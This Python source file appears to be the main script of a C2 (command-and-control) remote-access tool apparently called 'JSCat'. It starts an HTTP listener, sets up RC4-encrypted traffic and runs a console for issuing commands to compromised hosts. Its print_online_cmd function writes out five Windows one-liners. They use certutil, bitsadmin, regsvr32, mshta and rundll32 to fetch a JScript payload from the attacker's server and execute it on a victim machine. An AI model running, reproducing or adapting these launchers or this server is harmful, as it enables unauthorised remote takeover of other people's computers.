#!/usr/bin/env python3
# coding:utf-8
import os
import random
import string
import argparse
import socket
from collections import ChainMap
from lib.server import Server
from lib.log import Log
from lib.color import BOLD

'''
上线方式
'''

def print_online_cmd(host, port):
    print('-' * 80)
    print('[*]Execute in host:')
    print('[1] {} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
    print('[2] {} /transfer n http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('bitsadmin'), host, port))
    print('[3] {} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
    print('''[4] {} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format(BOLD('mshta'), host, port))
    print('[5] {} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'.format(BOLD('rundll32'), host, port))
    print('-' * 80)

'''
RC4加密的key
'''


def get_rc4_key(new_key):
    RC4_KEY_FILE = 'rc4_key.txt'
    # 读取原来的key
    if not new_key and os.path.exists(RC4_KEY_FILE):
        with open(RC4_KEY_FILE) as f1:
            key = f1.readline().strip()
        if len(key) > 0:
            return key
    # 生成新的key
    key = ''.join([random.choice(string.ascii_letters) for i in range(16)])
    with open(RC4_KEY_FILE, 'w') as f2:
        f2.write(key)

    return key

def run(cmdArguments):
    # 获取当前使用的rc4加密key
    rc4_key = get_rc4_key(cmdArguments.get('new_key'))
    Log.log_message(
        '[*]server cipher key: {}'.format(BOLD(rc4_key)), log_type=Log.SERVER)
    cmdArguments['new_key'] = rc4_key
    # 启动http监听服务
    host = cmdArguments['host']
    port = int(cmdArguments['port'])

    httpd = Server(cmdArguments)
    httpd.start()

    Log.log_message(
        '[*]host connect ip is {}:{}...'.format(BOLD(host), BOLD(port)), log_type=Log.SERVER)

    print_online_cmd(host, port)

    # 控制台命令输入
    try:
        while True:
            if not httpd.shell.get_command():
                httpd.shutdown()
                exit()
    except KeyboardInterrupt:
        httpd.shutdown()
        Log.log_message('server shutdown', log_type=Log.SERVER)

def getDefaultHost():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect(('8.8.8.8', 80))
        return sock.getsockname()[0]

def argsParser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', 
                        help='server foreign ip for host connect')
    parser.add_argument('-p', '--port',
                        help='server listening port,default is 6600')
    parser.add_argument('--new_key', action="store_true",
                        help="generate new rc4 key to encrypt data")
    parser.add_argument('-s', '--sleep_time',
                        help='set host sleep time in second,default is 5')

    argsDefault = {'host': getDefaultHost(), 'port': 6600, 'new_key': False, 'sleep_time': 5}
    
    return ChainMap({k:v for k, v in vars(parser.parse_args()).items() if v}, argsDefault)


def print_banner():
    banner = '''                                                   
      _    ___     ___             _     
   _ | |  / __|   / __|   __ _    | |_   
  | || |  \__ \  | (__   / _` |   |  _|  
  _\__/   |___/   \___|  \__,_|   _\__|  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
    '''
    print(banner)


def main():
    print_banner()
    run(argsParser())


if __name__ == '__main__':
    main()
